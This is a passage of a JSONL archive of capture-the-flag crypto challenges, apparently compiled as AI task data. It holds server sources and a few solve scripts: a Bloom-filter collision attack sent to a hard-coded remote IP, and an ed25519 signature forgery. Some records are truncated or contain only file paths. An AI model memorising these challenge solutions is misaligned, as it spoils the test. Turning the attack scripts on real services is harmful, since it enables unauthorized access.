b'\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x80'\n\n\ndef collision8(text):\n    return invert(bytes(i ^ j for i, j in zip(DIFF, forward(text))))\n\n\nsample_valid_password = b'A' * 28 + b'Aa1!'\nsample_colliding_password = collision8(\n    sample_valid_password[:8]) + sample_valid_password[8:]\n\nHOST, PORT = \"20.124.204.46\", 22629\nREM = pwn.remote(HOST, PORT)\nREM.sendline('2') # store sample key\nREM.sendline(sample_colliding_password.hex())\nREM.sendline('3') # claim flag\nREM.sendline(sample_valid_password.hex())\nREM.sendline('4') # exit\nprint(REM.recvall().decode())\n", "name": "solve"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-diffecient\\server_files\\source.py", "category": "crypto", "solution_code": "import math\nimport random\nimport re\nimport mmh3\nimport os\n\ndef randbytes(n): return bytes ([random.randint(0,255) for i in range(n)])\n\nclass BloomFilter:\n    def __init__(self, m, k, hash_func=mmh3.hash):\n        self.__m = m\n        self.__k = k\n        self.__i = 0\n        self.__digests = set()\n        self.hash = hash_func\n\n    def security(self):\n        false_positive = pow(\n            1 - pow(math.e, -self.__k * self.__i / self.__m), self.__k)\n        try:\n            return int(1 / false_positive).bit_length()\n        except (ZeroDivisionError, OverflowError):\n            return float('inf')\n\n    def _add(self, item):\n        self.__i += 1\n        for i in range(self.__k):\n            self.__digests.add(self.hash(item, i) % self.__m)\n\n    def check(self, item):\n        return all(self.hash(item, i) % self.__m in self.__digests\n                   for i in range(self.__k))\n\n    def num_passwords(self):\n        return self.__i\n\n    def memory_consumption(self):\n        return 4*len(self.__digests)\n\n\nclass PasswordDB(BloomFilter):\n    def __init__(self, m, k, security, hash_func=mmh3.hash):\n        super().__init__(m, k, hash_func)\n        self.add_keys(security)\n        self.addition_quota = 1\n        self.added_keys = set()\n\n    def add_keys(self, thresh_security):\n        while self.security() > thresh_security:\n            self._add(randbytes(256))\n        print(\"Added {} security keys to DB\".format(self.num_passwords()))\n        print(\"Original size of keys {} KB vs {} KB in DB\".format(\n            self.num_passwords()//4, self.memory_consumption()//1024))\n\n    def check_admin(self, key):\n        if not re.match(b\".{32,}\", key):\n            print(\"Admin key should be atleast 32 characters long\")\n            return False\n        if not re.match(b\"(?=.*[a-z])\", key):\n            print(\"Admin key should contain atleast 1 lowercase character\")\n            return False\n        if not re.match(b\"(?=.*[A-Z])\", key):\n            print(\"Admin key should contain atleast 1 uppercase character\")\n            return False\n        if not re.match(br\"(?=.*\\d)\", key):\n            print(\"Admin key should contain atleast 1 digit character\")\n            return False\n        if not re.match(br\"(?=.*\\W)\", key):\n            print(\"Admin key should contain atleast 1 special character\")\n            return False\n        if key in self.added_keys:\n            print(\"Admin account restricted for free tier\")\n            return False\n        return self.check(key)\n\n    def query_db(self, key):\n        if self.check(key):\n            print(\"Key present in DB\")\n        else:\n            print(\"Key not present in DB\")\n\n    def add_sample(self, key):\n        if self.addition_quota > 0:\n            self._add(key)\n            self.added_keys.add(key)\n            self.addition_quota -= 1\n            print(\"key added successfully to DB\")\n        else:\n            print(\"API quota exceeded\")\n\n\nBANNER = r\"\"\"\n ____  ____  ____  ____  ____  ___  ____  ____  _  _  ____\n(  _ \\(_  _)( ___)( ___)( ___)/ __)(_  _)( ___)( \\( )(_  _)\n )(_) )_)(_  )__)  )__)  )__)( (__  _)(_  )__)  )  (   )(\n(____/(____)(__)  (__)  (____)\\___)(____)(____)(_)\\_) (__)\n\nWelcome to diffecient security key database API for securely\nand efficiently saving tonnes of long security keys!\nFeel FREE to query your security keys and pay a little to\nadd your own security keys to our state of the art DB!\nWe trust our product so much that we even save our own keys here\n\"\"\"\nprint(BANNER)\nPASSWORD_DB = PasswordDB(2**32 - 5, 47, 768, mmh3.hash)\nwhile True:\n    try:\n        option = int(input(\"Enter API option:\\n\"))\n        if option == 1:\n            key = bytes.fromhex(input(\"Enter key in hex\\n\"))\n            PASSWORD_DB.query_db(key)\n        elif option == 2:\n            key = bytes.fromhex(input(\"Enter key in hex\\n\"))\n            PASSWORD_DB.add_sample(key)\n        elif option == 3:\n            key = bytes.fromhex(input(\"Enter key in hex\\n\"))\n            if PASSWORD_DB.check_admin(key):\n                flag = os.environ[\"FLAG\"]\n                print(flag)\n            else:\n                print(\"No Admin no flag\")\n        elif option == 4:\n            exit(0)\n    except:\n        print(\"Something wrong happened\")\n        exit(1)\n", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SEETF2022_probability\\release_files\\probability.py", "category": "crypto", "solution_code": "../server_files/probability.py", "name": "probability"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SEETF2022_probability\\server_files\\probability.py", "category": "crypto", "solution_code": "import os\nimport random\n\nFLAG = os.environ.get(\"FLAG\")\n\ndef play_round():\n    p1 = 0\n    while True:\n        drawn = random.random()\n        p1 += drawn\n        print(f'You draw a [{drawn}]. (p1 = {p1})')\n        if p1 >= 1:\n            print('You have gone bust. Dealer wins!')\n            return 1\n        if input('Do you want to hit or stand? ').lower() in ['s', 'stand']:\n            break\n          \n    p2 = 0\n    while p2 <= p1:\n        drawn = random.random()\n        p2 += drawn\n        print(f'Dealer draws a [{drawn}]. (p2 = {p2})')\n    \n    if p2 >= 1:\n        print('Dealer has gone bust. You win!')\n        return 0\n    else:\n        print(f'Dealer has a higher total. Dealer wins!')\n        return 1\n\ndef main():\n    print('================================================================================')\n    print('    Welcome to the SEETF Casino. We will play 1337 rounds of 1337 blackjack.    ')\n    print('   You play first, then the dealer. The highest total under 1 wins the round.   ')\n    print('  If you win at least 800 rounds, you will be rewarded with a flag. Good luck!  ')\n    print('================================================================================')\n\n    scores = [0, 0]\n    for i in range(1337):\n        print(f'Round {i + 1}:')\n        winner = play_round()\n        scores[winner] += 1\n        print(f'Score: {scores[0]}-{scores[1]}')\n        print('-' * 80)\n        \n        if scores[0] >= 800:\n            print(f'Here is your flag: {FLAG}')\n            return\n            \n    print('Better luck next time!')\n\nif __name__ == '__main__':\n    main()\n", "name": "probability"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ImaginaryCTF2023-Sus\\release_files\\challenge.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, isPrime, bytes_to_long\n\n\ndef sus(sz, d):\n    while True:\n        p = getPrime(sz)\n        pp = sum([p**i for i in range(d)])\n        if isPrime(pp):\n            return p, pp\n\n\np, q = sus(512, 3)\nr = getPrime(512 * 3)\nn = p * q * r\ne = 65537\nm = bytes_to_long(open(\"flag.txt\", \"rb\").read().strip())\nc = pow(m, e, n)\n\nprint(f\"{n = }\")\nprint(f\"{e = }\")\nprint(f\"{c = }\")\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ImagianryCTF-Daily-Leet-Universe\\release_files\\server.py", "category": "crypto", "solution_code": "../server_files/server.py", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ImagianryCTF-Daily-Leet-Universe\\server_files\\server.py", "category": "crypto", "solution_code": "#!/usr/bin/env python3\nfrom math import gcd\nimport os\n\nflag = os.environ.get(\n    \"FLAG\", \"jctf{red_flags_and_fake_flags_form_an_equivalence_class}\"\n)\n\nx = int(input(\"x = \"))\ng = gcd(x**13 + 37, (x + 42) ** 13 + 42)\nprint(flag[:g])\n", "name": "server"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ICC2022_unbalanced\\release_files\\challenge.py", "category": "crypto", "solution_code": "from Crypto.Util.number import bytes_to_long, getPrime\n\ndef gen_keys(n_bits, p_bits, d_bits):\n    q_bits = n_bits - p_bits\n    p, q = getPrime(p_bits), getPrime(q_bits)\n    N, phi = p*q, (p-1)*(q-1)\n    while True:\n        d = getPrime(d_bits)\n        if d > N**0.292:\n            break\n    e = pow(d,-1,phi)\n    return (N, e), (N, d)\n\ndef encrypt_flag(plaintext, pub):\n    N, e = pub\n    m = bytes_to_long(plaintext)\n    return pow(m, e, N)\n\nif __name__ == '__main__':\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n\n    n_bits = 1024\n    p_bits = 256\n    d_bits = 300\n    pub, priv = gen_keys(n_bits, p_bits, d_bits)\n    c = encrypt_flag(flag, pub)\n\n    print(f\"N = {hex(pub[0])}\")\n    print(f\"e = {hex(pub[1])}\")\n    print(f\"c = {hex(c)}\")", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ICC2022_ed25519-magic\\release_files\\chal.py", "category": "crypto", "solution_code": "../server_files/chal.py", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ICC2022_ed25519-magic\\server_files\\chal.py", "category": "crypto", "solution_code": "import base64\nimport ed25519\nimport os\nimport sys\n\nFLAG = os.environ.get(\"FLAG\")\n\n\ndef die(*args):\n    pr(*args)\n    quit()\n\n\ndef pr(*args):\n    s = \" \".join(map(str, args))\n    sys.stdout.write(s + \"\\n\")\n    sys.stdout.flush()\n\n\ndef level(i):\n    border = \"-\"\n    pr(border*72)\n    pr(border, f\" Level {i}\", border)\n    pr(border*72)\n\n\ndef sc():\n    return sys.stdin.readline().strip()\n\n\ndef get_keys():\n    signing_key, verifying_key = ed25519.create_keypair()\n    return signing_key, verifying_key\n\n\ndef verify(verifying_key, sig, msg):\n    try:\n        verifying_key.verify(sig, msg, encoding=\"base64\")\n        print(\"signature is good\")\n    except ed25519.BadSignatureError:\n        print(\"signature is bad!\")\n\n\ndef main():\n    level(1)\n\n    signing_key, verifying_key = get_keys()\n    msg = b\"CryptoHack\"\n    sig = signing_key.sign(msg)\n\n    pr(\"Signature:\")\n    pr(base64.b64encode(sig).decode())\n    pr(\"Enter new signature:\")\n    new_sig = base64.b64decode(sc())\n    if new_sig == sig:\n        die(\"Same signature\")\n\n    try:\n        verifying_key.verify(new_sig, msg)\n    except Exception:\n        die(\"Signature is bad!\")\n\n    level(2)\n\n    msg = os.urandom(16)\n\n    pr(\"Enter verifying key:\")\n    vk = base64.b64decode(sc())\n    pr(\"Enter signature:\")\n    sig = base64.b64decode(sc())\n\n    try:\n        verifying_key = ed25519.VerifyingKey(vk)\n    except Exception:\n        die(\"Key is bad!\")\n    try:\n        verifying_key.verify(sig, msg)\n    except Exception:\n        die(\"Signature is bad!\")\n\n    die(FLAG)\n\n\nif __name__ == '__main__':\n    main()\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\ICC2022_ed25519-magic\\server_files\\solution.py", "category": "crypto", "solution_code": "from pwn import *\nimport pure25519\nimport pure25519.basic as basic\n\ndef new_level():\n    p.recvline()\n    p.recvline()\n    p.recvline()\n\ndef signature_add_l(signature):\n    assert len(signature) == 64\n    r, s = signature[:32], signature[32:]\n\n    new_s = basic.bytes_to_scalar(s) + basic.L*15\n    import math\n    print(math.log(new_s, 2))\n    # print(math.log(basic.L * 2, 2))\n    new_s = binascii.unhexlify(\"%064x\" % new_s)[::-1]\n\n    return base64.b64encode(r + new_s)\n\nlevel = \"info\"\nlevel = \"debug\"\n# p = process(['python3', 'chal.py'], level = level)\np = remote(\"localhost\", 21012, level = level)\n\n# level1\nnew_level()\np.recvline()\nsig = p.recvline()\np.recvline()\nsig_data = base64.b64decode(sig)\nnew_sig = signature_add_l(sig_data)\np.sendline(new_sig)\n\n# level2\nnew_level()\np.recvline()\nvk = \"AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\"\np.sendline(vk)\np.recvline()\nsig = \"Sb1LmJq8FptB6GSTbi6IjYARGJM09wdk1MNkSHI59I1S/ItySz94QLLGjsbxupFy168PGqHqas3Fmd2PJk+yAw==\"\np.sendline(sig)\n\nprint(p.recvline())\n", "name": "solution"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HTB2021_Spongebob\\release_files\\spongebob.py", "category": "crypto", "solution_code": "../server_files/spongebob.py", "name": "spongebob"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\HTB2021_Spongebob\\server_files\\spongebob.py", "category": "crypto", "solution_code": "PBOXES = [[4, 0, 3, 2, 6, 8, 1, 13, 16, 7, 15, 12, 11, 9, 14, 10, 17, 5], [6, 13, 17, 8, 7, 11, 15, 5, 0, 10, 4, 16, 1, 3, 14, 12, 9, 2], [9, 17, 13, 11, 4, 10, 16, 8, 14, 7, 15, 1, 6, 5, 12, 3, 0, 2], [3, 14, 17, 5, 11, 2, 10, 12, 1, 16, 6, 9, 0, 4, 8, 15, 13, 7], [6, 9, 11, 16, 8, 10, 7, 14, 15, 12, 5, 1, 4, 0, 3, 17, 13, 2], [0, 13, 9, 6, 2, 15, 5, 11, 17, 14, 12, 16, 7, 3, 10, 4, 1, 8], [7, 0, 8, 13, 16, 1, 15, 17, 5, 14, 10, 3, 2, 12, 9, 4, 6, 11], [10, 4, 17, 7, 2, 1, 11, 13, 5, 6, 16, 8, 9, 0, 12, 3, 15, 14]]\nSBOX = [74, 3, 10, 192, 95, 220, 206, 247, 200, 66, 139, 64, 39, 5, 62, 207, 63, 81, 120, 30, 55, 121, 219, 107, 45, 156, 237, 211, 190, 125, 35, 162, 248, 216, 20, 26, 166, 80, 122, 37, 254, 177, 225, 14, 33, 76, 181, 227, 168, 51, 161, 218, 41, 18, 209, 71, 236, 25, 150, 241, 228, 119, 97, 85, 129, 194, 130, 195, 210, 123, 22, 102, 65, 203, 193, 128, 132, 144, 253, 134, 124, 48, 141, 54, 60, 224, 226, 246, 19, 148, 29, 91, 173, 243, 244, 88, 208, 7, 198, 103, 217, 43, 199, 24, 58, 160, 221, 151, 89, 214, 69, 82, 112, 115, 127, 155, 99, 180, 164, 172, 27, 109, 21, 185, 187, 145, 140, 96, 201, 137, 138, 0, 6, 142, 34, 251, 8, 72, 11, 75, 205, 70, 57, 174, 184, 204, 149, 163, 111, 59, 186, 79, 53, 42, 52, 110, 189, 104, 15, 196, 4, 188, 117, 36, 158, 197, 78, 61, 154, 242, 231, 223, 32, 17, 183, 56, 143, 233, 16, 169, 165, 245, 23, 101, 116, 38, 84, 135, 234, 133, 147, 46, 131, 67, 2, 136, 50, 167, 86, 118, 1, 9, 202, 73, 12, 191, 235, 153, 152, 238, 213, 222, 68, 28, 239, 93, 215, 176, 98, 126, 159, 13, 250, 94, 87, 113, 49, 31, 83, 232, 229, 108, 240, 170, 175, 100, 44, 230, 255, 114, 249, 40, 178, 47, 77, 252, 105, 179, 146, 182, 171, 157, 212, 106, 92, 90]\nINIT = [248, 142, 163, 165, 248, 3, 71, 246, 9, 67, 203, 73, 195, 2, 192, 201, 203, 136]\n\nBLOCKSIZE = 8\n\ndef blocks(x):\n    return list(zip(*[iter(x)] * BLOCKSIZE))\n\ndef permute(s):\n    res = [0 for _ in s]\n    for b in range(8):\n        for i, x in enumerate(s):\n            res[PBOXES[b][i]] |= (x & (1 << b))\n    return res\n\ndef H(m):\n    assert len(m) % BLOCKSIZE == 0\n    state = INIT[:]\n    for b in blocks(m):\n        for i, c in enumerate(b):\n            state[i] ^= c\n        for _ in range(8):\n            state = permute(state)\n            state = [SBOX[b] for b in state]\n    return bytes(state)\n\nif __name__ == \"__main__\":\n    import os\n\n    print(\"Who lives in a pineapple under the sea?\")\n    a = bytes.fromhex(input(\"> \").strip())\n    b = bytes.fromhex(input(\"> \").strip())\n    assert a != b\n    assert H(a) == H(b)\n    \n    print(os.environ[\"FLAG\"])\n", "name": "spongebob"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-tenet-the-plagarism\\release_files\\challenge.py", "category": "crypto", "solution_code": "import re\nfrom Crypto.Util import Counter\nfrom Crypto.Cipher import AES\nimport os\n\n# (Obseleted - This was a comment in HKCERT CTF 2020. Please delete this.)\n# In the future, we have not only time inversion but also quantum computers.\n# So, we need to encrypt twice to double the key size.\n#\n# Mystiz: I just want to make a challenge as soon as possible. Let's do brainless copy and paste.\nclass TenetAES():\n    def __init__(self, key):\n        self.aes128_00 = AES.new(key=key[ 0: 1] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_01 = AES.new(key=key[ 1: 2] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_02 = AES.new(key=key[ 2: 3] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_03 = AES.new(key=key[ 3: 4] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_04 = AES.new(key=key[ 4: 5] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_05 = AES.new(key=key[ 5: 6] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_06 = AES.new(key=key[ 6: 7] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_07 = AES.new(key=key[ 7: 8] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_08 = AES.new(key=key[ 8: 9] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_09 = AES.new(key=key[ 9:10] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_10 = AES.new(key=key[10:11] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_11 = AES.new(key=key[11:12] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_12 = AES.new(key=key[12:13] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_13 = AES.new(key=key[13:14] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_14 = AES.new(key=key[14:15] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n        self.aes128_15 = AES.new(key=key[15:16] + b'\\0'*15, mode=AES.MODE_CTR, counter=Counter.new(128, initial_value=0))\n\n    def encrypt(self, s):\n        s = self.aes128_00.encrypt(s)\n        s = self.aes128_01.encrypt(s)\n        s = self.aes128_02.encrypt(s)\n        s = self.aes128_03.encrypt(s)\n        s = self.aes128_04.encrypt(s)\n        s = self.aes128_05.encrypt(s)\n        s = self.aes128_06.encrypt(s)\n        s = self.aes128_07.encrypt(s)\n        s = self.aes128_08.encrypt(s)\n        s = self.aes128_09.encrypt(s)\n        s = self.aes128_10.encrypt(s)\n        s = self.aes128_11.encrypt(s)\n        s = self.aes128_12.encrypt(s)\n        s = self.aes128_13.encrypt(s)\n        s = self.aes128_14.encrypt(s)\n        s = self.aes128_15.encrypt(s)\n        return s\n\n    def decrypt(self, data):\n        s = self.aes128_15.decrypt(s)\n        s = self.aes128_14.decrypt(s)\n        s = self.aes128_13.decrypt(s)\n        s = self.aes128_12.decrypt(s)\n        s = self.aes128_11.decrypt(s)\n        s = self.aes128_10.decrypt(s)\n        s = self.aes128_09.decrypt(s)\n        s = self.aes128_08.decrypt(s)\n        s = self.aes128_07.decrypt(s)\n        s = self.aes128_06.decrypt(s)\n        s = self.aes128_05.decrypt(s)\n        s = self.aes128_04.decrypt(s)\n        s = self.aes128_03.decrypt(s)\n        s = self.aes128_02.decrypt(s)\n        s = self.aes128_01.decrypt(s)\n        s = self.aes128_00.decrypt(s)\n        return s\n\ndef main():\n    with open('flag.txt', 'r') as f:\n        flag = f.read()\n\n    assert re.match(r'hkcert21\\{\\w{35}\\}', flag)\n\n    message = f'Congratulations! {flag}'.encode()\n\n    key = os.urandom(16)\n\n    cipher = TenetAES(key)\n    ciphertext = cipher.encrypt(message).hex()\n    print(ciphertext)\n\nif __name__ == '__main__':\n    main()", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sratslla-sea\\release_files\\aes.py", "category": "crypto", "solution_code": "#!/usr/bin/env python\n\n\n\"\"\"\n    Copyright (C) 2012 Bo Zhu http://about.bozhu.me\n    Permission is hereby granted, free of charge, to any person obtaining a\n    copy of this software and associated documentation files (the \"Software\"),\n    to deal in the Software without restriction, including without limitation\n    the rights to use, copy, modify, merge, publish, distribute, sublicense,\n    and/or sell copies of the Software, and to permit persons to whom the\n    Software is furnished to do so, subject to the following conditions:\n    The above copyright notice and this permission notice shall be included in\n    all copies or substantial portions of the Software.\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL\n    THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n    FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n    DEALINGS IN THE SOFTWARE.\n\n    Modified by Mystiz so that:\n    1. the code is now Python 3 compatible, and\n    2. the __add_round_key, __sub_bytes, __shift_rows, __mix_columns can be modified outside.\n\"\"\"\n\nSbox = (\n    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,\n    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,\n    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,\n    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,\n    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,\n    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,\n    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,\n    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,\n    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,\n    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,\n    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,\n    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,\n    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,\n    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,\n    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,\n    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,\n)\n\nInvSbox = (\n    0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB,\n    0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB,\n    0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E,\n    0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25,\n    0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92,\n    0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84,\n    0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06,\n    0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B,\n    0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73,\n    0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E,\n    0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B,\n    0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4,\n    0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F,\n    0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF,\n    0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61,\n    0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D,\n)\n\n\n# learnt from http://cs.ucsb.edu/~koc/cs178/projects/JT/aes.c\nxtime = lambda a: (((a << 1) ^ 0x1B) & 0xFF) if (a & 0x80) else (a << 1)\n\n\nRcon = (\n    0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40,\n    0x80, 0x1B, 0x36, 0x6C, 0xD8, 0xAB, 0x4D, 0x9A,\n    0x2F, 0x5E, 0xBC, 0x63, 0xC6, 0x97, 0x35, 0x6A,\n    0xD4, 0xB3, 0x7D, 0xFA, 0xEF, 0xC5, 0x91, 0x39,\n)\n\n\ndef text2matrix(text):\n    text = int.from_bytes(text, 'big')\n    matrix ", "name": "aes"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\hkcert2021-sratslla-sea\\release_files\\chall.py", "category": "crypto", "solution_code": "import os\nfrom aes import AES\nimport hashlib\n\n# A function that does nothing\nno_op = lambda *x: None\n\ndef main():    \n    k = os.urandom(16)\n    cipher = AES(k)\n    secret = b''.join(k[i:i+1]*4 for i in range(16))\n\n    flag = os.environ.get('FLAG', 'hkcert21{***********************REDACTED***********************}').encode()\n    assert len(flag) == 64\n\n    flag = b''.join([cipher.encrypt(flag[i:i+16]) for i in range(0, 64, 16)])\n    print(f'Hey. This is the encrypted flag you gotta decrypt: {flag.hex()}.')\n\n    options = ['ark', 'sb', 'sr', 'mc']\n    suboptions = ['data', 'secret']\n    \n    for _ in range(128):\n        [option, suboption, *more] = input('> ').split(' ')\n        if option not in options: raise Exception('invalid option!')\n        if suboption not in suboptions: raise Exception('invalid suboption!')\n        \n        if suboption == 'secret':\n            options.remove(option)\n            message = secret\n        else:\n            message = bytes.fromhex(more[0])\n            if len(message) != 16: raise Exception('invalid length!')\n            message = message * 4\n\n        if option == 'ark':\n            # Stage 1: \"AddRoundKey\" does nothing\n            cipher = AES(k)\n            cipher._add_round_key = no_op\n            ciphertext = cipher.encrypt(message[0:16])\n        elif option == 'sb':\n            # Stage 2: \"SubBytes\" does nothing\n            cipher = AES(k)\n            cipher._sub_bytes = no_op\n            ciphertext = cipher.encrypt(message[16:32])\n        elif option == 'sr':\n            # Stage 3: \"ShiftRows\" does nothing\n            cipher = AES(k)\n            cipher._shift_rows = no_op\n            ciphertext = cipher.encrypt(message[32:48])\n        elif option == 'mc':\n            # Stage 4: \"MixColumns\" does nothing\n            cipher = AES(k)\n            cipher._mix_columns = no_op\n            ciphertext = cipher.encrypt(message[48:64])\n\n        print(ciphertext.hex())\n\nif __name__ == '__main__':\n    main()\n\n", "name": "chall"}
